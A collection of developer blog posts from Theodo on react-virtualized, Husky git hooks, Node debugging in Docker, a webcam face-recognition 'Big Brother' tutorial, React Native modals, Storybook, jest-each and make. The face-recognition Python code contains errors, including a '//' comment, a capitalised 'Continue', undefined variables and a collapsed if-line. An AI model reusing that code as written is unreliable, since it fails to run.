    rowRenderer={this.rowRenderer}
    headerHeight={20}
  />
 )}
</AutoSizer>

It is very simple:

We wrap the list with the AutoSizer HOC
It uses the CellMeasurerCache to know the height of each row and the rowRenderer to render the elements.

How it works :
First, you instantiate a new CellMeasurerCache that will contain all the calculated heights :

constructor(props) {
 super(props);
 this.cache = new CellMeasurerCache({ //Define a CellMeasurerCache --> Put the height and width you think are the best
 defaultHeight: 80,
 minHeight: 50,
 fixedWidth: true,
 });
}

Then, you use the CellMeasurer in the rowRenderer method:

rowRenderer = ({
   key, // Unique key within array of rows
   index, // Index of row within collection
   parent,
   isScrolling, // The List is currently being scrolled --> Important if you need some perf adjustment
   isVisible, // This row is visible within the List (eg it is not an overscanned row)
   style, // Style object to be applied to row (to position it)
}) => (
   <CellMeasurer
     cache={this.cache}
     columnIndex={0}
     key={key}
     parent={parent}
     rowIndex={index}
   >
   <div
     className=""Row""
     key={key}
     style={{
       ...style,
       display: 'flex',
     }}
   >
     <span style={{ width: 400 }}>{rows[index].name}</span>
     <span style={{ width: 100 }}>{rows[index].age}</span>
   </div>
   </CellMeasurer>
);

 
Pitfall:
Finally, we obtain a nice windowed list, ready to be deployed and used…
Unless your application contain filters or some data added dynamically.
Actually, when I implemented this, after using some filters, some blank spaces were staying in the list.
It is a performance consideration due to the fact we use a cache, but it is a good compromise unless you have many rows and many columns in a Grid (as we display a list, we only have 1 column).
Consequently, I managed to fix this issue by clearing the cache every time my list had its data reloaded:

componentWillReceiveProps() { //Really important !!
 this.cache.clearAll(); //Clear the cache if row heights are recompute to be sure there are no ""blank spaces"" (some row are erased)
 this.virtualizedList && this.virtualizedList.recomputeRowHeights(); //We need to recompute the heights
}

A big thanks to Brian Vaughn for this amazing library

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Cyril Gaunet
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										tl:dr
To add a pre-commit git hook with Husky:

Install Husky with npm install husky --save-dev
Set the pre-commit command in your package.json:

""scripts"": {
    ""precommit"": ""npm test""
},

What are git hooks?
Git hooks are scripts launched when carrying out some git actions. The most common one is the pre-commit hook that runs when performing git commit, before the commit is actually created.
The scripts are located in the .git/hooks folder. Check out the .sample file examples in your local git repository.

Why do I need to install the Husky package then?
The problem with git hooks is that they are in the .git directory, which means that they are not committed hence not shared between developers.
Husky takes care of this: when a developer runs npm install, it will automatically create the scripts in .git/hooks:

Theses scripts will parse your package.json and run the associated command. For example, the pre-commit script will run the npm run precommit command
""scripts"": {
    ""precommit"": ""npm test""
},

To add husky to your project, simply run npm install husky --save-dev.
For more complex commands, I recommend to use a separate bash script : ""precommit"": ""bash ./scripts/check-lint.sh"".
Enhancing your git flow
Git hooks are a convenient way to automate tasks during your git flow and protect you from pushing unwanted code by mistake.

Check for linting errors

If you have tools to check the code quality or formatting, you can run it on a pre-commit hook:
""scripts"": {
    ""precommit"": ""prettier-check \""**/*.js\"" && eslint . --quiet""
},

I advise to run those tests on your CI tool as well, but checking it on a precommit hook can make you save a lot of time as you won’t have to wait for your CI to set up your whole project and fail only because you forgot a semicolon.

Protect important branches

In some rare situations, you have to push code directly on a branch that is deployed. One way to protect it from developers in a hurry who forget to run the tests locally is to launch them on a pre-push hook:
""scripts"": {
    ""prepush"": ""./scripts/pre-push-check.sh""
},


#!/bin/bash
set -e

branch=$(git branch | sed -n -e 's/^\* \(.*\)/\1/p')
if [ ""$branch"" == ""master"" ]
then
    npm test
fi


If your tests fail, the code won’t be pushed.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Hugo Lime
  			
  				Agile Web Developer at Theodo.

Passionate about new technologies to make web apps stronger and faster.  			
  		
    
			

									"
"
										This is a quick guide on how to set up the debugger in VS code server-side for use with Node.js in a Docker container. I recently worked on a project which uses the Koa.js framework as the API. Whilst trying to set up the debugger with VS code, a google search led to several articles that had conflicting information about how to set it up and the port number to expose, or was overly verbose and complicated.
To keep things simple, I have split this into 3 steps.
1) Check version of Node.js on server
To do this with docker-compose set up, use the following, replace [api] with the name of your docker container.
docker-compose exec api node --version
Inspector Protocol (Node V7+, since Oct 2016)
Recent versions of Node.js now uses the inspector protocol. This is easier to set up and is the default setting for new Node.js applications, as most documentation will refer to this protocol. This means that:

The --inspect flag is required when starting the node process.
By default, the port 9229 is exposed, and is equivalent to --inspect:9229
The port can be changed, eg. --inspect-brk:1234 . Here, the ‘-brk’ flag adds a breakpoint on start.

Legacy Protocol (Node V6 and earlier)
Older versions of Node.js (prior to V7) uses the ‘Legacy Debugger’. The version of Node.js used on my project was 6.14. This means that:

The --debug flag is required when starting the node process.
By default, the port 5858 is exposed, and is equivalent to --debug:5858
This port cannot be changed.

For more information goto:
https://code.visualstudio.com/docs/nodejs/nodejs-debugging
https://nodejs.org/en/docs/guides/debugging-getting-started/
2) Expose port in Node and Docker
In ‘package.json’, add --debug:5858  (or --inspect:9229 depending on Node version) when starting Node, so:
""dev"": ""nodemon index.js"", becomes
""debug"": ""nodemon --debug:5858 index.js"",
In ‘docker-compose.yml’, run the debug node command and expose the port. In my case:
api:
build: ./api
command: yarn dev
volumes:
- ./api:/code
ports:
- ""4000:4000""
becomes:
api:
build: ./api
command: yarn debug
volumes:
- ./api:/code
ports:
- ""4000:4000""
- ""5858:5858""
3) Set launch configuration of Debugger
In ‘/.vscode/launch.json’, my launch configuration is:
{
""type"": ""node"",
""request"": ""attach"",
""name"": ""Docker: Attach to Node"",
""port"": 5858,
""address"": ""localhost"",
""localRoot"": ""${workspaceFolder}/api/"",
 ""remoteRoot"": ""/code/"",
""protocol"": ""legacy""
}
The port and protocol needs to correspond to the version of Node used as determine above. For newer versions of Node: ""port"": ""9229"" and ""protocol"": ""inspector"" should be used.
“localRoot” and “remoteRoot” should be set to the folder corresponding to the entry point (eg. index.js) of your Node application in the local repository and the docker folder respectively.
4) Attach debugger and go!
In VS code, set your breakpoints and press F5 or click the green triangle button to start debugging! By default VS code comes with a debug panel to the left and debug console to the bottom, and a moveable debug toolbar. Mousing over a variable shows its values if it has any.

 
I hope this article has been useful, and thanks for reading my first tech blog!  

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Ho-Wan To
  			
  				  			
  		
    
			

									"
"
										How to recode Big Brother in 15 min on your couch
Face Recognition Explained
In this article, we will step by step implement a smart surveillance system, able to recognise people in a video stream and tell you who they are. 
More seriously, we’ll see how we can recognise in real-time known faces that appear in front of a camera, by having a database of portraits containing those faces.
First, we’ll start by identifying the different essential features that we’ll need to implement. To do that, we’ll analyse the way we would to that, as human beings (to all the robots that are reading those words, I hope I don’t hurt your feelings too much and I truly apologize for the methodology of this article).
Ask yourself : if someone passes just in front of you, how would you recognise him ?

You’ll need first to see the person
You then need to focus on the face itself
Then there are actually two possibilities.

Either I know this individual and I can recognise him by comparing his face with every face I know.
Or I don’t know him



Let’s see now how to the algo will do those different steps.
First step of the process : seeing the person
This is quite a simple step. We’ll simply need a computer and a webcam, to capture the video stream. 
We’ll use openCV Python. With a few lines of code, we’ll be able to capture the video stream, and dispose of the frame one by one.
import cv2

video_capture = cv2.VideoCapture(0)

while True:
   # Capture frame-by-frame
   frame = video_capture.read()

   # Display the resulting frame
   cv2.imshow('Video', frame)

   if cv2.waitKey(1) & 0xFF == ord('q'):
       break

# When everything is done, release the capture
video_capture.release()
cv2.destroyAllWindows()


How to detect a face in a picture ?
To be able to find a face in the picture, let’s ask ourselves, what is a face and how can we discriminate a face from Gmail’s logo for example ?


We actually do it all the time without even thinking about it. But how can we know that easily that all these pictures are faces ?

When we look at those different pictures, photographs and drawings, we see that a face is actually made of certain common elements : 

A nose
Two eyes
A mouth 
Ears
…

But not only are the presence of these elements essential, but their positions is also paramount. 
Indeed, in the two pictures here, you’ll find all the elements that you’ll find in a face. Except one is a face, and one is not.

So, now that we’ve seen that a face is characterised by certain criterias, we’ll turn them into simple yes-no questions, which will be very useful to find a face in a square image.
As a matter of fact, the question “Is there a face in a picture ?” is very complex. However, we’ll be able to approximate it quite well by asking one after the other a series of simple question : “is there a nose ?” ; “Is there an eye ? If yes, is their two eyes ?” ; “Are there ears ?” ; “Is there some form of symmetry ?”. 
All these questions are both far more simple than the complex question “Is there a face in the picture ?”, while providing us with information to know if part of the image is or is not a face. 
For each one of these questions, a no answer is very strong and will tell us that there is definitely no face in the picture. 
On the contrary, a yes answer will not allow us to be sure that there is a human face, but it will slightly increase the probability of the presence of a face. If the image is not a face, but it is tree, the answer to the first question “is there a nose ?” will certainly be negative. No need then to ask if there are eyes, or if there is some form of symmetry.
However, if indeed there is a nose, we can go forward and ask “are there ears?”. If the answer is still yes, this won’t mean that there is a face, but will slightly increase the likeliness of this possibility, and we will keep digging until being sufficiently confident to say that there is a face indeed.
The interest is that the simplicity of the questions will reduce drastically the cost of face detection, and allow to do real-time face detection on a video stream. 
This is the principle of a detection method called “the cascade of weak classifier”. Every classifier is very weak considering that it gives only a very little degree of certitude. But if we do the checks one by one, and a region of the picture has them all, we’ll be at the end almost sure that a face is present here. 
That’s why it is called a cascade classifier, because like a series of waterfalls, the algorithm will simply do a very simple and quick check, one by one, and will only move forward with another check if the first one is positive. 
To do face detection on the whole picture, and considering that we don’t know in advance the size of the face, we’ll simply apply the cascade algorithm on a moving window for every frame.

What we’ve explained here is the principle of the algorithm. Lots of research has been made about how to use cascade for object detection. OpenCV has a built-in way to do face detection with a cascade classifier, by using a set of 6,000 weak classifiers especially developed to do face detection.
import cv2

opencv_path = 'm33/lib/python3.7/site-packages/cv2/data/'
face_cascade = cv2.CascadeClassifier(opencv_path + 'haarcascade_frontalface_default.xml')

video_capture = cv2.VideoCapture(0)

while True:
    # Capture frame-by-frame
    ret, frame = video_capture.read()

    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)

    faces = face_cascade.detectMultiScale(gray, scaleFactor=1.3, minNeighbors=5)
 
    # Draw a rectangle around the faces
    for (x, y, w, h) in faces:
        cv2.rectangle(frame, (x, y), (x+w, y+h), (0, 255, 0), 2)

    # Display the resulting frame
    cv2.imshow('Video', frame)

    if cv2.waitKey(1) & 0xFF == ord('q'):
        break

# When everything is done, release the capture
video_capture.release()
cv2.destroyAllWindows()

Now that we can detect the face, we need to recognise it among other known faces. Here is what we got : 
Face recognition
Now that we have a system able to detect a face, we need to make sense out of it and recognise the face.
By applying the same methodology as before, we’ll find the criterias to recognise a face among others.
To do that, let’s look at how we differentiate between two faces : Harry Potter on one side, and Aragorn on the second.

Let’s make a list of the things that can differentiate them : 

Form of their nose
Form of their eyes
Their hair
Color of their eyes
Distance between the eyes
Skin color
Beard
Height of the face
Width of the face
Ratio of height to width

Of course, this list is not exhaustive. However, are all those criterias good for face recognition ? 
Skin color is a bad one for example. We’ve all seen Harry Potter or Aragorn after hard battles covered with dirt or mud, and we’re still able to recognise them easily.
Same goes for height and width of the face. Indeed, these measures change a lot with the distance of the person to the camera. Despite that we can easily recognise the faces even when their size changes. 
So we can keep some good criterias that will really help recognise a face : 

Form of their nose
Form of their eyes
Distance between the eyes
Ratio of height to width 
Position of the nose relative to the whole face
Form of eyebrows
…

Let’s now measure all these elements. By doing this, we’ll have a set of values that describe the face of an individual. These measures are a discrete description of what the face looks like.

Actually, what we have done, is that we reduced the face to a limited number of “features” that will give us valuable and comparable information of the given face.

Mathematically speaking, we have simply created a vector space projection, that allowed us to reduce the number of dimensions in our problem. From a million-dimensions vector space problems (if the picture is 1MPixel RGB image, the vector space is of 1M * 3 dimensions) to a an approximately a-hundred-dimension vector space. The problem becomes far more simple ! 
No need to consider all the pixels in the picture at all, we only need to extract from the image a limited set of features. These extracted features can be considered as vectors that we can then compare the way we do it with any vector by computing euclidean distances for example.

And just like that, comparing faces becomes mathematically as simple as computing the distance between two points on a grid, with only a few more dimensions ! To be simple, it’s as though, every portrait can then be described as a point in space. The closer points are, the more likely they describe the same face ! And that’s all !
When we find a face in a frame, we find its position in the feature-space and we look for the nearer known point. If the distance between the two is close, we’ll consider that they’re both linked to the same face. Otherwise, if the point representing the new face is too far from all the faces known, it means we don’t know this face.

To implement that, we’ll use the face_recognition Python library that allows us to use a deep learning algorithm that extracts from a face a 128-dimension vector of features. 
We’ll do it in two steps.
We first turn our portrait database into a set of computed feature-vectors (reference points like the Frodo point in the example above). 
import face_recognition
import os
import pandas as pd

def load_image_file(file):
    im = PIL.Image.open(file)
    im = im.convert('RGB')
    return np.array(im)

face_features = []
names = []

for counter, name in enumerate(os.listdir('photos/')):
   if '.jpg' not in name:
       continue
   image = load_image_file(pictures_dir + name)
   try:
       face_features.append(face_recognition.face_encodings(image)[0])
       names.append(name.replace('.jpg', ''))
   except IndexError:
	// happens when no face is detected
       Continue

features_df = pd.DataFrame(face_features, names)
features_df.to_csv('database.csv')


Then, we load the database and launch the real-time face recognition:
import cv2
import pandas as pd
from helpers import load_database
import PIL
import numpy as np
import face_recognition

def load_image_file(file):
    im = PIL.Image.open(file)
    im = im.convert('RGB')
    return np.array(im)

face_features = []
names = []

for counter, name in enumerate(os.listdir('photos/')):
   if '.jpg' not in name:
       continue
   image = load_image_file(pictures_dir + name)
   try:
       face_features.append(face_recognition.face_encodings(image)[0])
       names.append(name.replace('.jpg', ''))
   except IndexError:
       # happens when no face is detected
       Continue

face_cascade= cv2.CascadeClassifier('m33/lib/python3.7/site-packages/cv2/data/haarcascade_frontalface_default.xml')

video_capture = cv2.VideoCapture(0)

while True:
   # Capture frame-by-frame
   ret, frame = video_capture.read()
   gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
   faces = face_cascade.detectMultiScale(gray, scaleFactor=1.3, minNeighbors=5)
  
   # Draw a rectangle around the faces
   for (x, y, w, h) in faces:
       cv2.rectangle(frame, (x, y), (x+w, y+h), (0, 255, 0), 2)

       pil_im = PIL.Image.fromarray(frame[y:y+h, x:x+w])
       face = np.array(pil_im.convert('RGB'))
       try:
           face_descriptor = face_recognition.face_encodings(face)[0]
       except Exception:
           continue
       distances = np.linalg.norm(face_descriptors - face_descriptor, axis=1)
       if(np.min(distances) < 0.7): found_name = names[np.argmin(distances)] print(found_name) print(found_name) #y = top - 15 if top - 15 > 15 else top + 15
       cv2.putText(frame, found_name, (y, y-15), cv2.FONT_HERSHEY_SIMPLEX,
                   0.75, (0, 255, 0), 2)

   # Display the resulting frame
   cv2.imshow('Video', frame)

   if cv2.waitKey(1) & 0xFF == ord('q'):
       break

# When everything is done, release the capture
video_capture.release()
cv2.destroyAllWindows()


And here it comes ! 

Here is a github repo with the code working : https://github.com/oussj/big_brother_for_dummies
External links I used : 

https://github.com/ageitgey/face_recognition
https://medium.com/@ageitgey/machine-learning-is-fun-part-4-modern-face-recognition-with-deep-learning-c3cffc121d78
https://realpython.com/face-recognition-with-python/


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Oussamah Jaber
  			
  				After graduating from MINES ParisTech, I joined Theodo as an agile web developer to use cutting-edge technology and build awesome products !  			
  		
    
			

									"
"
										At some point during the development of your React Native application, you will use a Modal. A Modal is a component that appears on top of everything.
There are a lot of cool libraries out there for modals, so today, we’ll have a look a the best libraries for different use cases.
Click on “Tap to play” on the playground below to start:


You can experience the app on your phone here and check the code on github.
Before choosing a library, you have to answer those 2 questions:

What do I want to display in the modal ?
How great do I want the UX to be ?

To answer the 2nd question, we list a few criteria that make a good UX :
1️⃣ The user can click on a button to close the modal
2️⃣ The user can touch the background to close the modal
3️⃣ The user can swipe the modal to close it
4️⃣ The user can scroll inside the modal
I) Alert
First, if you simply want to display some information and perform an action based on the decision of your user, you should probably go with a native Alert. An alert is enough and provides a much simpler and more expected UX. You can see how it will look like below.

II) Native modal
If you want to show more information to your user, like a picture or a customised button, you need a Modal. The simplest modal is the React Native modal. It gives you the bare properties to show and close the modal 1️⃣, so it is really easy to use ✅. The downside is that it requires some effort to customise so as to improve the user experience ❌.

import { Modal } from ""react-native"";
...
        <Modal
          animationType=""slide""
          transparent={true}
          visible={this.state.modalVisible}
          onRequestClose={this.closeModal} // Used to handle the Android Back Button
        >

III) Swipeable Modal
If you want to improve the UX, you can allow the user to swipe the modal away. For example, if the modal comes from the top like a notification, it feels natural to close it by pulling it up ⬆️. If it comes from the bottom, the user will be surprised if they cannot swipe it down ⬇️. It’s even better to highlight the fact that they can swipe the modal with a little bar with some borderRadius. The best library for that use case would be the react-native-modal library. It is widely customisable and answers to criteria 1️⃣, 2️⃣ and 3️⃣.

import Modal from ""react-native-modal"";
...
        <Modal
          isVisible={this.state.visible}
          backdropOpacity={0.1}
          swipeDirection=""left""
          onSwipe={this.closeModal}
          onBackdropPress={this.closeModal}
        >

IV) Scrollable modal
So far so good, now let’s see some more complex use cases. For instance, you may want the content of the modal to be scrollable (if you are displaying a lot of content or a Flatlist). The scroll may conflict with either the scroll of the modal or the scroll of the container of the Modal, if it is a scrollable component. For this use case, you can still use the react-native-modal library. You will have 1️⃣, 2️⃣ and 4️⃣. You can control the direction of the swipe with… swipeDirection.

import Modal from ""react-native-modal"";
...
        <Modal
          isVisible={this.state.visible}
          backdropOpacity={0.1}
          onSwipe={this.closeModal}
          // swipeDirection={""left""} <-- We can't specify swipeDirection since we want to scroll inside the modal
          onBackdropPress={this.closeModal}
        >

⚠️ Don’t try to combine swipeable + scrollable with this library. Instead continue reading…
V) Swipeable + Scrollable modal
The previous libraries are already awesome, but if you want your modal to answer criteria 1️⃣, 2️⃣, 3️⃣and 4️⃣, you need react-native-modalbox. This library is still very easy to use ✅and has everything out of the box ✅, and is listed in the awesome libraries by awesome-react-native. The only downside is that the modal from this library always appear from the bottom, and you can only swipe it down ❌.

import Modal from ""react-native-modalbox"";
...
        <Modal
          style={styles.container}
          swipeToClose={true}
          swipeArea={20} // The height in pixels of the swipeable area, window height by default
          swipeThreshold={50} // The threshold to reach in pixels to close the modal
          isOpen={this.state.isOpen}
          onClosed={this.closeModal}
          backdropOpacity={0.1}
        >

To avoid the collision between the scroll of your content and the swipe to close the modal, you have to specify swipeArea and swipeThreshold.
Conclusion
There are a lot of libraries built on top of the native modal. It is important to choose the right one depending on your needs. If you want to control the direction of the swipe, use react-native-modal, but if you want the modal to only come from the bottom, use react-native-modalbox.
The libraries I’ve talked about are amazing. Thanks to their contributors.

Please reach out if you think I missed something.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Antoine Garcia
  			
  				  			
  		
    
			

									"
"
										A year ago I was a young developer starting his journey on React. My client came to see my team and told us: “We need to make reusable components”, I asked him: “What is a reusable component?” and the answer was “This project is a pilot on the subject”.
2 months later another developer tried to use our components and the disillusion started: despite our efforts, our component were not reusable 😱
At the time we managed to work with him to improve our code so that he could use it, but how could we have avoided the problem?
The answer was given to me by Florian Rival, a former developer at Bam, now working for Facebook: Storybook !
 Storybook, what is that?
It is an open source visual documentation software (here is the repo). It allows you to display the different states of your component. The cluster of all the different cases for your component are called the component stories.
This allows you to visually describe your components : anyone who wants to use your components can just look at your stories and see how to use it. No need to dig in the code to find all the use cases, they are all there!
A picture is worth a thousand words, so just check the best example I know, the open Storybook of Airbnb.
One interesting thing to note is that it’s working with Vue, Angular and React!
Usage example
Let’s make an example to explain this better to you. I will use a react todo list, I started with the one on this repo.
Then I added Storybook to the project, I won’t detail this part as the Storybook doc is very good. I would say it takes approximately 20 minutes to add storybook to your project, but might take longer to properly setup your asset builder.
Now I’ll focus on the component FilteredList that display the todos, first it looked like this:

import React from 'react';
import styled from 'styled-components';
import TodoItem from './TodoItem';

const StyledUl = styled.ul`
  list-style: none;
`;

const StyledP = styled.p`
  margin: 10px 0;
  padding: 10px;
  border-radius: 0;
  background: #f2f2f2;
  border: 1px solid rgba(229, 229, 229, 0.5);
  color: #888;
`;

export default function FilteredList(props) {
    const {items, changeStatus} = props;

    if (items.length === 0) {
        return (
            <StyledP>There are no items.</StyledP>
        );
    }

    return (
        <StyledUl>
            {items.map(item => (
                <TodoItem key={item.id} data={item} changeStatus={changeStatus}/>
            ))}
        </StyledUl>
    );
}

(It is not exactly the same as the one on the repo, I used styled-component instead of plain css)
TodoItem is the component that displays an element of the list.
Here we can see there are two different branches in the render: the nominal case and the empty state.
Let’s write some stories, I created a file FilteredList.stories.js and added this inside:

import React from 'react';
import { storiesOf } from '@storybook/react';
import FilteredList from ""./FilteredList"";

const data = [{
    id: 1,
    completed: true,
    text: 'Jean-Claude Van Damme'
}];

storiesOf('FilteredList')
    .add('Nominal usage', () => (
        <FilteredList items={data} changeMode={() => void 0}/>
    ))
    .add('Empty state', () => (
        <FilteredList items={[]} changeMode={() => void 0}/>
    ));

So what did I do here?
I defined placeholder data in a variable for the component props.
We use the function storiesOf from storybook, this function takes the name we want to give to the group of stories as entry param.
Then we add some stories with .add. It works pretty much like jest or mocha’s describe or it in tests, it takes the name of the story and a function that returns the component to render.
Here’s what it looks like:


It’s rather simple but it’s working, we see the two different cases.
What if we add other branches? Let’s say the parent component of FilteredList is calling an API to get the list and so we have to add a loading and error state.

export default function FilteredList(props) {
    const {items, changeStatus, isLoading, error} = props;

    if (isLoading) {
        return (
            <StyledP>Loading...</StyledP>
        )
    }

    if (error) {
        return (
            <StyledP>Sorry an error occurred with the following message: {error}</StyledP>
        )
    }
    
    //...
}

Now we need to add the corresponding stories.

.add('Loading state', () => (
        <FilteredList items={[]} changeMode={() => void 0} isLoading />
))
.add('Error state', () => (
    <FilteredList items={[]} changeMode={() => void 0} error=""Internal server error""/>
));

And now our Storybook looks like:


This example is rather simple but it shows pretty well how we worked with Storybook. Each time you create new component behaviors you then create the corresponding stories.
Ain’t nobody got time for that?
In fact it takes time when you are coding but I feel like it is more like an investment.
When you develop your app aren’t you trying to make it easy to use? Then why not make it easy for developers to use your code?
And that’s where Storybook is helping you, now your components are easier to share, this leads to a better collaboration between developers and therefore to better component development practices shared inside the team.
This is very important because you are not the only user of your code, you might be working with a team or someone else will take over your project afterwards.
We all had this part in our project code that have been here for ages and no one really know how to deal with it, how to avoid that? Make it good the first time you code it! Seems obvious but still is right, and for that you can use Storybook to share your front end components and make perfect APIs! (or at least very good ones)
Final thoughts
In a way we are all trying to do reusable components – whether you are trying to do a library or not, you want other members of your team to be able to update/fix your code. It’s not easy to make perfect APIs for your components if you can not have a lot of user feedback and that’s why Storybook or any visual doc are so efficient. They improve greatly the vision others have of your component and help them modify it without breaking anything.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Léo Anesi
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										jest-each is a small library that lets you write jest test cases with just one line.
It was added to Jest in version 23.0.1 and makes editing, adding and reading tests much easier. This article will show you how a jest-each test is written with examples of where we use it on our projects.
A simple example jest test for a currencyFormatter function looks like this:
describe('currencyFormatter', () => {
  test('converts 1.59 to £1.59', () => {
    const input = 1.59;
    const expectedResult = ""£1.59""
    expect(currencyFormatter(input)).toBe(expectedResult)
  })
  test('converts 1.599 to £1.60', () => {
    const input = 1.599;
    const expectedResult = ""£1.60""
    expect(currencyFormatter(input)).toBe(expectedResult)
  })
})

The currencyFormatter function takes in one number argument, input, and returns a string of the number to 2 decimal places with a £ prefix. Simple.
But, what if you want to add more test cases? Maybe you want your currencyFormatter to comma separate thousands, or handle non-number inputs in a certain way. With the standard jest tests above, you’d have to add five more lines per test case.
With jest-each you can add new test cases with just one line:
describe('currencyFormatter', () => {
  test.each`
    input     | expectedResult
    ${'abc'}  | ${undefined}
    ${1.59}   | ${'£1.59'}
    ${1.599}  | ${'£1.60'}
    ${1599}   | ${'£1,599.00'}
    // add new test cases here
  `('converts $input to $expectedResult', ({ input, expectedResult }) => {
    expect(currencyFormatter(input)).toBe(expectedResult)
  })
})

There are 4 parts to writing a jest-each test:

The first line in the template string:

test.each`
  input | expectedResult
...
`

This defines the variable names for your test, in this case input and expectedResult. Each variable must be seperated by a pipe | character, and you can have as many as you want.

The test cases:

`...
  ${'abc'}  | ${undefined}
  ${1.59}   | ${'£1.59'}
  ${1.599}  | ${'£1.60'}
  ${1599}   | ${'£1,599.00'}
  // add new test cases here
`
...

Each line after the first represents a new test. The variable values are set to the relevant variable names in the first row and they are also seperated by a pipe | character.

Print message string replacement:

('$input converts to $expectedResult', ...)

You can customise the print message to include variable values by prefixing your variable names with the dollar symbol $. This makes it really easy to identify which test case is failing when you run your tests. For example, the print messages for the example test above looks like this:


Passing the variables into the test:

('$input converts to $expectedResult', ({ input, expectedResult }) => {
  expect(someFunction(input)).toBe(expectedResult)
})

An object of variables is passed to the test as the first argument of the anonymous function where you define your test assertions. I prefer to deconstruct the object in the argument.
jest-each with Older Versions of Jest
You can still use jest-each with older versions of Jest by installing it independently:
npm install jest-each

There are a just two things that you’ll need to do differently in your test files:

Import jest-each at the top of your test file
Use each``.test instead of test.each``

The currencyFormatter test above would look like this instead:
import each from 'jest-each'

 describe('currencyFormatter', () = {
   each`
     input     | expectedResult
     ${1.59}   | ${'£1.59'}
     ${1.599}  | ${'£1.60'}
     // add new test cases here
   `.test('converts $input to $expectedResult', ({ input, expectedResult }) => {
    expect(currencyFormatter(input)).toBe(expectedResult)
  })
})

And that’s all there is to it! Now you have enough to start writing tests with jest-each!
jest-each Tests
Service Test Example
jest-each makes testing services, like a currencyFormatter, very quick and easy. It’s also amazing for test driven development if that’s how you like to develop. We have found it has been really useful for documenting how a service is expected to work for new developers joining a project because of how easy the test cases are to read.
For example:
import currencyFormatter from 'utils/currencyFormatter'

describe('currencyFormatter', () => {
  test.each`
    input    | configObject | expectedResult | configDescription
    ${'abc'} | ${undefined} | ${undefined}   | ${'none'}
    ${5.1}   | ${undefined} | ${'£5.10'}     | ${'none'}
    ${5.189} | ${undefined} | ${'£5.19'}     | ${'none'}
    ${5}     | ${{dec: 0}}  | ${'£5'}        | ${'dec: 0'}
    ${5.01}  | ${{dec: 0}}  | ${'£5'}        | ${'dec: 0'}
    // add new test cases here
  `('converts $input to $expectedResult with config: $configDescription',
    ({ input, configObject, expectedResult} ) => {
      expect(currencyFormatter(input, configObject)).toBe(expectedResult)
    }
  )
})

Here we have a slightly more complicated currencyFormatter function that takes an extra configObject argument. We want to test that:

it returns undefined when input is not a number
the default number of decimal places is 2
that the configObject can set the number of decimal places with the dec key

We want to be able to identify the tests when they are running so we have also added a configDescription variable so we can add some text to the test’s print message.
Higher Order Component Test Example
We like to use jest-each to test and document the properties added to components by higher order components (HOCs). I’ve found this simple test particularly helpful when refactoring our large codebase of HOCs, where it has prevented bugs on multiple occasions. We have even added a project snippet so that setting up this test for new HOCs is even easier:
import { shallow } from 'enzyme'
import HomePage from '/pages'
import isLoading from '/hocs'

const TestComponent = isLoading(HomePage)

describe('wrapper', () => {
  const component = shallow(<TestComponent/>)
  test.each`
    propName
    ${'isLoading'}
    // add new test cases here
  `('wrapper adds $propName to the component', ({ propName }) => {
    expect(Object.keys(component.props()).toContainEqual(propName)
  })

  test.each`
    propName
    ${'notThisProp'}
    ${'orThisOne'}
    // add new test cases here
  `('wrapper does not add $propName to the component',
    ({ propName }) => {
      expect(Object.keys(component.props()).not.toContainEqual(propName)
    }
  )
})

Snapshot Branches Test Example
You can also test multiple snaphsot branches succintly by using jest-each:
import Button from '/components'

describe('Component', () => {
  const baseProps = {
    disabled: false,
    size: 'small',
  }
  test.each`
    changedProps        | testText
    ${{}}               | ${'base props'}
    ${{disabled: true}} | ${'disabled = true'}
    ${{size: 'large'}}  | ${'size = large'}
    // add new test cases here
  `('snapshot: $testText', ({ changedProps }) => {
    const component = shallow(<Button {...baseProps} {...changedProps} />)
    expect(component).toMatchSnaphot()
  })
})

You can learn more about snapshot tests here.
These three types of tests, plus some Cypress integration and end-to-end tests is enough for our current application… but that discussion is for another post.
Happy testing with jest-each!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Mike Riddelsdell
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										For one of Theodo’s clients, we built a complex website including a catalog, account management and the availability to order products.
As a result, the project was complex, with several languages (symfony, vue, javascript), utilities (docker, aws, webpack) and microservices (for the search of products, the management of accounts, the orders).
The impact of this complexity for the development teams was the numerous commands they had to use every day, and particularly to install the project.
Thus, and following Symfony 4 best practices, we decided to use make on the project to solve these problems.
And it worked!
What is make
Make is a build automation tool created in 1976, designed to solve dependency problems of the build process.
It was originally used to get compiled files from source code, for instance for C language.
In website development, an equivalent could be the installation of a project and its dependencies from the source code.
Let me introduce a few concepts about make that we will need after.
Make reads a descriptive file called Makefile, to build a target, executing some commands, and depending on a prerequisite.
The architecture of the Makefile is the following:

target: [prerequisite]
    command1
    [command2]

And you run make target in your terminal to execute the target commands. Simple, right?
Use it for project installation
What is mainly used to help project installation is a README describing the several commands you need to run to get your project installed.
What if all these commands were executed by running make install?
You would have your project working with one command, and no documentation to maintain anymore.
I will only describe a simple way to build dependencies from your composer.json file

vendor: composer.json
    composer install

This snippet will build the vendor directory, running composer install, only if the vendor directory does not exist. Or if composer.json file has changed since the last time you built the vendor directory.
Note that if you don’t want to check the existency of a directory or a file named as your target, you can use a Phony Target. It means adding the line .PHONY: target to your Makefile.
There is much more you can do, and I won’t talk about it here.
But if you want a nice example to convert an installation README into a Makefile, you can have a look at these slides, that are coming from a talk at Paris Symfony Live 2018.
Use it for the commonly used commands you need on your project
